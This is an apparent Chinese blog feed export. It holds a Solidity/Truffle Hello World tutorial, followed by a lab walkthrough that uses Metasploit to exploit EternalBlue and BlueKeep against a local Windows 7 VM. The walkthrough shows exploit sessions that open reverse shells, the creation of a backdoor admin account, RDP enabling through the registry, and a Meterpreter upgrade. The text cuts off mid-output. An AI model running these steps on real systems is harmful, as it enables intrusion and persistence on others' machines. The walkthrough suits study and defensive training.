    <content type="html"><![CDATA[<p>参考 <a href="https://learnblockchain.cn/docs/solidity/index.html" target="_blank" rel="noopener">Solidity 0.5.9 中文文档</a>。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>Ubuntu 16.04.6</li></ul><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>Solidity 是一种智能合约的高级语言，运行在 Ethereum 虚拟机（EVM）之上。它的语法接近于 JavaScript，是一种面向对象的语言。但作为一种真正意义上运行在网络上的去中心合约，它又有很多的不同，下面列举一些：</p><ul><li>以太坊底层是基于账户，而非 <a href="https://me.tryblockchain.org/Solidity%e7%9a%84%e5%9c%b0%e5%9d%80%e7%b1%bb%e5%9e%8b.html" target="_blank" rel="noopener">UTXO</a> 的，所以有一个特殊的 Address 的类型。用于定位用户，定位合约，定位合约的代码（合约本身也是一个账户）。</li><li>由于语言内嵌框架是支持支付的，所以提供了一些关键字，如 <a href="https://me.tryblockchain.org/%e6%94%af%e4%bb%98%e7%9b%b8%e5%85%b3.html" target="_blank" rel="noopener">payable</a>，可以在语言层面直接支持支付，而且超级简单。</li><li>存储是使用网络上的区块链，数据的每一个状态都可以永久存储，所以需要确定变量使用内存，还是区块链。</li><li>运行环境是在去中心化的网络上，会比较强调合约或函数执行的调用的方式。因为原来一个简单的函数调用变为了一个网络上的节点中的代码执行，分布式的感觉。</li><li>最后一个非常大的不同则是它的异常机制，一旦出现异常，所有的执行都将会被回撤，这主要是为了保证合约执行的原子性，以避免中间状态出现的数据不一致。</li></ul><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>下面尝试编写 Solidity 下的 Hello World。</p><p>第一步是安装 nodejs 和 npm，然后才能安装 truffle：</p><pre><code class="bash">sudo apt updatesudo apt install npm nodejs nodejs-legacysudo npm install npm -gsudo npm install n -gsudo n stable # 下载稳定版 nodesudo npm install -g truffle truffle-contract web3 --unsafe-perm=true --allow-root</code></pre><p>安装完 truffle 后，下载 <a href="https://github.com/trufflesuite/ganache/releases/download/v2.1.1/ganache-2.1.1-linux-x86_64.AppImage" target="_blank" rel="noopener">Ganache</a> 以方便搭建本地区块链环境（Ganache 在内存中模拟了一个区块链，因此每次 Ganache 关闭之后，区块链会丢失）。下载完后双击打开软件并启动本地环境。</p><p>各部分都成功安装之后，新建一个目录，并在目录下运行 <code>truffle init</code>：</p><pre><code>➜  HelloWorld truffle init✔ Preparing to download✔ Downloading✔ Cleaning up temporary files✔ Setting up boxUnbox successful. Sweet!Commands:  Compile:        truffle compile  Migrate:        truffle migrate  Test contracts: truffle test</code></pre><p>简单说明一下生成的几个文件：</p><ul><li><code>/contracts</code>：存放智能合约原始代码的地方。</li><li><code>/migrations</code>：这是 Truffle 用来部署智能合约的功能。</li><li><code>/test</code>：测试智能合约的代码放在这里，支持 <code>js</code> 与 <code>sol</code> 测试。</li><li><code>truffle-config.js</code>：Truffle 的设置文档。</li></ul><p>Solidity 中合约的含义就是一组代码（函数）和数据（状态），它们位于以太坊区块链的一个特定地址上。关键字 <code>pragma</code> 告知编译器源代码所适用的 Solidity 版本为 &gt;=0.4.0 及 &lt;0.7.0，为了确保合约不会在新的编译器版本中突然行为异常。</p><p>关键字 <code>contract</code> 即为指定合约，关键字 <code>function</code> 指定函数。<code>public</code> 指定函数的公开权限，<code>view</code> 用来标识那些不改变存储状态的方法（相比之下而 <code>pure</code> 更加严格，它修饰的方法不但不改变存贮状态，也不读取存储的变量值），<code>returns</code> 指定返回值的数据类型。</p><blockquote><p>注意：所有的标识符（合约名称，函数名称和变量名称）都只能使用 ASCII 字符集。UTF-8 编码的数据可以用字符串变量的形式存储；小心使用 Unicode 文本，因为有些字符虽然长得相像（甚至一样），但其字符码是不同的，其编码后的字符数组也会不一样。</p></blockquote><p>以下为一个简单的返回 <code>Hello World</code> 的函数：</p><pre><code class="sol">pragma solidity &gt;=0.4.0 &lt;0.7.0;contract HelloWorld {    function sayHello() public view returns (string memory) {        return &quot;Hello World&quot;;    }}</code></pre><p>然后输入 <code>truffle compile</code> 进行编译：</p><pre><code class="bash">➜  HelloWorld truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/HelloWorld.sol&gt; Compiling ./contracts/Migrations.sol    &gt; compilation warnings encountered:/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure  function sayHello() public view returns (string memory) {  ^ (Relevant source part starts here and spans across multiple lines).&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts&gt; Compiled successfully using:   - solc: 0.5.8+commit.23d335f2.Emscripten.clang</code></pre><p>接下来我们需要在 <code>migrations</code> 下添加一个部署文件 <code>2_deploy_contracts.js</code>，用来待会儿对 <code>HelloWorld.sol</code> 的部署。部署文件的文件名要求以数字为前缀，后缀为描述。编号前缀是必需的，以便记录迁移是否成功运行，后缀纯粹是为了方便理解。</p><blockquote><p>注意：编号还有记录运行迁移文件顺序的作用。</p></blockquote><p>使用 <code>artifacts.require</code> 语句来取得准备部署的合约。使用 <code>deployer.deploy</code> 语句将合约部署到区块链上。这边 HelloWorld 是 contract 的名称而不是文件名。因此可以用此语法读入任一 <code>.sol</code> 文件中的任一合约。</p><pre><code class="js">const HelloWorld = artifacts.require(&quot;HelloWorld&quot;);module.exports = function(deployer) {  deployer.deploy(HelloWorld);};</code></pre><p>在确保之前的 <code>Ganache</code> 已经启动并生成了十个账户后，输入 <code>truffle migrate</code> 将合约部署到 <code>Ganache</code> 上。</p><pre><code>➜  HelloWorld truffle migrateCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name:    &#39;ganache&#39;&gt; Network id:      5777&gt; Block gas limit: 0x6691b71_initial_migration.js======================   Deploying &#39;Migrations&#39;   ----------------------   &gt; transaction hash:    0xc3b75999936e57ba192b2053a581762c1f235aad3090caea5572c3deb1d98802   &gt; Blocks: 0            Seconds: 0   &gt; contract address:    0x55a333d4f932a737E0b97af4E3F8F4E971600D43   &gt; block number:        5   &gt; block timestamp:     1569581737   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0   &gt; balance:             99.98561934   &gt; gas used:            261393   &gt; gas price:           20 gwei   &gt; value sent:          0 ETH   &gt; total cost:          0.00522786 ETH   &gt; Saving migration to chain.   &gt; Saving artifacts   -------------------------------------   &gt; Total cost:          0.00522786 ETH2_deploy_contracts.js=====================   Deploying &#39;HelloWorld&#39;   ----------------------   &gt; transaction hash:    0x9c05c079cbdbb90a3d53fdf5e66e3a79fce1a0e5f633815068c9a82aaaf912b0   &gt; Blocks: 0            Seconds: 0   &gt; contract address:    0x4752C4f381D9e492e10daCCf9213d916bd1f8caF   &gt; block number:        7   &gt; block timestamp:     1569581739   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0   &gt; balance:             99.98223486   &gt; gas used:            127201   &gt; gas price:           20 gwei   &gt; value sent:          0 ETH   &gt; total cost:          0.00254402 ETH   &gt; Saving migration to chain.   &gt; Saving artifacts   -------------------------------------   &gt; Total cost:          0.00254402 ETHSummary=======&gt; Total deployments:   2&gt; Final cost:          0.00777188 ETH</code></pre><p>最后执行 <code>truffle console</code>，可以使用 <code>js</code> 与刚才部署的合约进行交互：</p><pre><code class="truffle">truffle(ganache)&gt; let x = await HelloWorld.deployed()undefinedtruffle(ganache)&gt; x.sayHello()&#39;Hello World&#39;</code></pre><p>我们还可以尝试添加一个函数 <code>echo</code>，可以输出我们传入的字符串：</p><pre><code class="sol">pragma solidity &gt;=0.4.0 &lt;0.7.0;contract HelloWorld {    function sayHello() public view returns (string memory) {        return &quot;Hello World&quot;;    }    function echo(string memory name) public view returns (string memory) {        return name;    }}</code></pre><p>要重新编译 Truffle 项目里的合约，请切换到项目工程所在根目录。后续运行中，Truffle 将仅编译自上次编译以来有更改的合约，如果想覆盖可以使用 <code>--all</code> 选项。</p><pre><code>➜  HelloWorld truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/HelloWorld.sol    &gt; compilation warnings encountered:/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:4:3: Warning: Function state mutability can be restricted to pure  function sayHello() public view returns (string memory) {  ^ (Relevant source part starts here and spans across multiple lines).,/home/assassinq/SmartContract/HelloWorld/contracts/HelloWorld.sol:8:3: Warning: Function state mutability can be restricted to pure  function echo(string memory name) public view returns (string memory) {  ^ (Relevant source part starts here and spans across multiple lines).&gt; Artifacts written to /home/assassinq/SmartContract/HelloWorld/build/contracts&gt; Compiled successfully using:   - solc: 0.5.8+commit.23d335f2.Emscripten.clang</code></pre><p>部署时需要加上 <code>--reset</code> 参数进行重新部署。</p><pre><code>➜  HelloWorld truffle migrate --resetCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name:    &#39;ganache&#39;&gt; Network id:      5777&gt; Block gas limit: 0x6691b71_initial_migration.js======================   Replacing &#39;Migrations&#39;   ----------------------   &gt; transaction hash:    0x73d288f20ed2d68fe565fb01e8a15ba1a591c0cfd642028b45056fc057c194e6   &gt; Blocks: 0            Seconds: 0   &gt; contract address:    0x48245c079FA8558a35629BC9b8A94b00c91eD9A9   &gt; block number:        9   &gt; block timestamp:     1569581861   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0   &gt; balance:             99.97646654   &gt; gas used:            261393   &gt; gas price:           20 gwei   &gt; value sent:          0 ETH   &gt; total cost:          0.00522786 ETH   &gt; Saving migration to chain.   &gt; Saving artifacts   -------------------------------------   &gt; Total cost:          0.00522786 ETH2_deploy_contracts.js=====================   Replacing &#39;HelloWorld&#39;   ----------------------   &gt; transaction hash:    0x8a7ca29c50f2e2f5645a9b4c33e5ca0eb6ab50def348c2ebcfe2f6fd38d9851e   &gt; Blocks: 0            Seconds: 0   &gt; contract address:    0x0d12C183e366AE74393346ae33d4b662bfB5492F   &gt; block number:        11   &gt; block timestamp:     1569581862   &gt; account:             0x6e5707f027eF99beF9Aa6f5c03Ac7678757E0bA0   &gt; balance:             99.97130642   &gt; gas used:            215983   &gt; gas price:           20 gwei   &gt; value sent:          0 ETH   &gt; total cost:          0.00431966 ETH   &gt; Saving migration to chain.   &gt; Saving artifacts   -------------------------------------   &gt; Total cost:          0.00431966 ETHSummary=======&gt; Total deployments:   2&gt; Final cost:          0.00954752 ETH</code></pre><p>最后进行交互：</p><pre><code class="truffle">truffle(ganache)&gt; let x = await HelloWorld.deployed()undefinedtruffle(ganache)&gt; x.sayHello()&#39;Hello World&#39;truffle(ganache)&gt; x.echo(&#39;This is assassinq.&#39;)&#39;This is assassinq.&#39;</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/liyuechun520/article/details/78036363" target="_blank" rel="noopener">https://blog.csdn.net/liyuechun520/article/details/78036363</a><br><a href="https://blog.csdn.net/weixin_42595515" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42595515</a><br><a href="https://www.jianshu.com/p/983122b8243e" target="_blank" rel="noopener">https://www.jianshu.com/p/983122b8243e</a><br><a href="http://blog.sina.com.cn/s/blog_bad31d930102xa1l.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_bad31d930102xa1l.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>blockchain</tag>
      
      <tag>sol</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Have Fun with Metasploit-Framework</title>
    <link href="/2019/09/16/Have-Fun-with-Metasploit-Framework/"/>
    <url>/2019/09/16/Have-Fun-with-Metasploit-Framework/</url>
    
    <content type="html"><![CDATA[<p>使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。</p><a id="more"></a><h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit-Framework"></a>Metasploit-Framework</h1><p>Metasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。其最为知名的子项目是开源的 Metasploit 框架，一套针对远程主机进行开发和执行“exploit 代码”的工具。其他重要的子项目包括 Opcode 数据库、shellcode 档案、安全研究等内容。</p><p>在本实验中使用 Kali Linux 下的 Metasploit Framework。</p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul><li>VMware Fusion：专业版 11.1.0</li><li>LHOST：Kali Rolling (2019.2) x64（IP：192.168.1.109）</li><li>RHOST：Windows 7 SP1 旗舰版 (64 位)（IP：192.168.1.102）</li></ul><h1 id="EternalBlue"><a href="#EternalBlue" class="headerlink" title="EternalBlue"></a>EternalBlue</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p><a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="noopener">永恒之蓝</a>是美国国家安全局开发的漏洞利用程序，于 2017 年 4 月 14 日被黑客组织影子掮客泄漏。该工具利用 <strong>445/TCP</strong> 端口的档案分享协议的漏洞进行散播。尽管微软于 2017 年 3 月 14 日已经发布过 Microsoft Windows 补丁修补了这个漏洞，然而在 5 月 12 日 WannaCry 勒索软体利用这个漏洞传播时，很多用户仍然因为没有安装补丁而受害。由于 WannaCry 的严重性，微软于 2017 年 5 月 13 日为已超过支持周期的 Microsoft Windows XP、Microsoft Windows 8 和 Windows Server 2003 发布了紧急安全更新，以阻止其散布造成更大的危害。</p><p>下面通过 Metasploit Framework 对 EternalBlue 进行利用。</p><h2 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h2><p>先使用 <code>auxiliary/scanner/smb/smb_ms17_010</code> 模块对靶机进行扫描：</p><pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show optionsModule options (auxiliary/scanner/smb/smb_ms17_010):   Name         Current Setting                                                 Required  Description   ----         ---------------                                                 --------  -----------   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check   RHOSTS       192.168.1.102                                                   yes       The target address range or CIDR identifier   RPORT        445                                                             yes       The SMB service port (TCP)   SMBDomain    .                                                               no        The Windows domain to use for authentication   SMBPass                                                                      no        The password for the specified username   SMBUser                                                                      no        The username to authenticate as   THREADS      1                                                               yes       The number of concurrent threadsmsf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.1.102:445     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>确定存在漏洞后使用 <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块攻击，并得到 CMD Shell：</p><pre><code>msf5 &gt; use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show optionsModule options (exploit/windows/smb/ms17_010_eternalblue):   Name           Current Setting  Required  Description   ----           ---------------  --------  -----------   RHOSTS         192.168.1.102    yes       The target address range or CIDR identifier   RPORT          445              yes       The target port (TCP)   SMBDomain      .                no        (Optional) The Windows domain to use for authentication   SMBPass                         no        (Optional) The password for the specified username   SMBUser                         no        (Optional) The username to authenticate as   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.Exploit target:   Id  Name   --  ----   0   Windows 7 and Server 2008 R2 (x64) All Service Packsmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit[*] Started reverse TCP handler on 192.168.1.109:4444[+] 192.168.1.102:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.1.102:445 - Connecting to target for exploitation.[+] 192.168.1.102:445 - Connection established for exploitation.[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)[*] 192.168.1.102:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima[*] 192.168.1.102:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service[*] 192.168.1.102:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet[*] 192.168.1.102:445 - Starting non-paged pool grooming[+] 192.168.1.102:445 - Sending SMBv2 buffers[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.1.102:445 - Sending final SMBv2 buffers.[*] 192.168.1.102:445 - Sending last fragment of exploit packet![*] 192.168.1.102:445 - Receiving response from exploit packet[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.1.102:445 - Sending egg to corrupted connection.[*] 192.168.1.102:445 - Triggering free of corrupted buffer.[*] Command shell session 1 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49161) at 2019-09-17 02:41:44 -0400[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=C:\Windows\system32&gt;</code></pre><h1 id="BlueKeep"><a href="#BlueKeep" class="headerlink" title="BlueKeep"></a>BlueKeep</h1><h2 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h2><p><a href="https://en.wikipedia.org/wiki/BlueKeep" target="_blank" rel="noopener">BlueKeep</a>（CVE-2019-0708）是 Microsoft 远程桌面协议实现中发现的一个安全漏洞，它允许远程执行代码。首次报告于 2019 年 5 月，它存在于从 Windows 2000 到 Windows Server 2008 R2 和 Windows 7 的所有未修补的基于 Windows NT 的 Microsoft Windows 版本中。Microsoft 发布了一个安全补丁（包括几个版本的带外更新） 在 2019 年 5 月 14 日，已经达到其寿命结束的 Windows，例如 Windows XP。在 2019 年 8 月 13 日，据报道，相关的 BlueKeep 安全漏洞（统称为 DejaBlue）会影响较新的 Windows 版本，包括 Windows 7 和所有最新版本 高达 Windows 10 的操作系统，以及较旧的 Windows 版本。2019 年 9 月 6 日，Metasploit 利用可疑的 BlueKeep 安全漏洞宣布已经发布到公共领域。</p><p>下面通过 Metasploit Framework 对 BlueKeep 进行利用，具体脚本来自 <a href="https://github.com/NAXG/cve_2019_0708_bluekeep_rce" target="_blank" rel="noopener">Github</a>。</p><h2 id="Scan-1"><a href="#Scan-1" class="headerlink" title="Scan"></a>Scan</h2><p>先使用 <code>auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code> 模块对靶机进行扫描：</p><pre><code>msf5 &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeepmsf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show optionsModule options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):   Name             Current Setting  Required  Description   ----             ---------------  --------  -----------   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random   RDP_DOMAIN                        no        The client domain name to report during connect   RDP_USER                          no        The username to report during connect, UNSET = random   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier   RPORT            3389             yes       The target port (TCP)   THREADS          1                yes       The number of concurrent threadsAuxiliary action:   Name  Description   ----  -----------   Scan  Scan for exploitable targetsmsf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)[+] 192.168.1.102:3389    - The target is vulnerable.[*] 192.168.1.102:3389    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>确定存在漏洞后使用 <code>exploit/windows/smb/ms17_010_eternalblue</code> 模块攻击，并得到 CMD Shell：</p><pre><code>msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3target =&gt; 3msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show optionsModule options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):   Name             Current Setting  Required  Description   ----             ---------------  --------  -----------   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random   RDP_DOMAIN                        no        The client domain name to report during connect   RDP_USER                          no        The username to report during connect, UNSET = random   RHOSTS           192.168.1.102    yes       The target address range or CIDR identifier   RPORT            3389             yes       The target port (TCP)Exploit target:   Id  Name   --  ----   3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit[*] Started reverse TCP handler on 192.168.1.109:4444[*] 192.168.1.102:3389    - Detected RDP on 192.168.1.102:3389    (Windows version: 6.1.7601) (Requires NLA: No)[+] 192.168.1.102:3389    - The target is vulnerable.[*] 192.168.1.102:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.[*] 192.168.1.102:3389 - Surfing channels ...[*] 192.168.1.102:3389 - Lobbing eggs ...[*] 192.168.1.102:3389 - Forcing the USE of FREE&#39;d object ...[*] Command shell session 2 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49162) at 2019-09-17 02:47:40 -0400C:\Windows\system32&gt;</code></pre><h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h1><p>在获取到 CMD Shell 之后可以做更多好玩的事情，比如使用 Meterpreter 进行后渗透等等，这里只记录一部分。</p><h2 id="新建用户并进行远程连接"><a href="#新建用户并进行远程连接" class="headerlink" title="新建用户并进行远程连接"></a>新建用户并进行远程连接</h2><p>在得到一个 CMD Shell 后，可以新建一个用户并加入管理员组：</p><pre><code class="cmd">C:\Windows\system32&gt;net user hacker hacker /addnet user hacker hacker /add����ɹ���ɡ�C:\Windows\system32&gt;net localgroup administrators hacker /addnet localgroup administrators hacker /add����ɹ���ɡ�</code></pre><p>开启远程连接：</p><pre><code class="cmd">C:\Windows\system32&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f����ɹ���ɡ�</code></pre><p>然后使用 Kali 下的远程桌面进行连接，使用新创建的用户 hacker 登录：</p><pre><code class="bash">rdesktop 192.168.1.102:3389# rdesktop 192.168.1.102 -u hacker -p hacker</code></pre><p><img src="/pics/Have-Fun-with-Metasploit-Framework/1.png" srcset="/img/loading.gif" alt></p><h2 id="将普通的-CMD-Shell-升级为-Meterpreter"><a href="#将普通的-CMD-Shell-升级为-Meterpreter" class="headerlink" title="将普通的 CMD Shell 升级为 Meterpreter"></a>将普通的 CMD Shell 升级为 Meterpreter</h2><p>原本的 CMD Shell 可以做的事情有限，使用 sessions 命令升级到 Meterpreter 可以做更多好玩的事。</p><pre><code>msf5 &gt; sessionsActive sessions===============  Id  Name  Type               Information                                                                       Connection  --  ----  ----               -----------                                                                       ----------  1         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102)  2         shell x64/windows  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)msf5 &gt; sessions -u 1[*] Executing &#39;post/multi/manage/shell_to_meterpreter&#39; on session(s): [1][*] Upgrading session ID: 1[*] Starting exploit/multi/handler[*] Started reverse TCP handler on 192.168.1.109:4433msf5 &gt;[*] Sending stage (179779 bytes) to 192.168.1.102[*] Meterpreter session 3 opened (192.168.1.109:4433 -&gt; 192.168.1.102:49163) at 2019-09-17 02:55:12 -0400[*] Stopping exploit/multi/handlermsf5 &gt; sessionsActive sessions===============  Id  Name  Type                     Information                                                                       Connection  --  ----  ----                     -----------                                                                       ----------  1         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102)  2         shell x64/windows        Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-Q595JS8OROC                                             192.168.1.109:4433 -&gt; 192.168.1.102:49163 (192.168.1.102)</code></pre><p>多了一个 session 3，打开后得到 Meterpreter 的 Shell：</p><pre><code>msf5 &gt; sessions 3[*] Starting interaction with 3...meterpreter &gt;</code></pre><p>然后可以看到得到的 Meterpreter 是 32 位的，可以通过把它绑定到某个 64 位的程序（所属用户为 SYSTEM）来修改成 64 位：</p><pre><code>meterpreter &gt; sysinfoComputer        : WIN-Q1ST6EBNLTROS              : Windows 7 (Build 7601, Service Pack 1).Architecture    : x64System Language : zh_CNDomain          : WORKGROUPLogged On Users : 2Meterpreter     : x86/windowsmeterpreter &gt; psProcess List============ PID   PPID  Name                    Arch  Session  User                          Path ---   ----  ----                    ----  -------  ----                          ---- 0     0     [System Process] 4     0     System                  x64   0 100   780   audiodg.exe             x64   0 268   4     smss.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe 352   344   csrss.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 404   344   wininit.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe 416   396   csrss.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe 420   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe 464   396   winlogon.exe            x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe 512   404   services.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe 520   404   lsass.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe 528   404   lsm.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe 572   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE 632   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM 696   512   vmacthlp.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe 728   512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE 780   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE 896   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM 960   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe 964   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM 1096  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE 1192  512   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe 1228  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE 1240  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM 1300  512   msdtc.exe               x64   0        NT AUTHORITY\NETWORK SERVICE 1440  512   VGAuthService.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe 1464  512   vmtoolsd.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe 1624  512   sppsvc.exe              x64   0        NT AUTHORITY\NETWORK SERVICE 1704  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE 1744  512   mscorsvw.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe 1768  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE 1836  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe 1844  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe 1860  632   WmiPrvSE.exe 1984  512   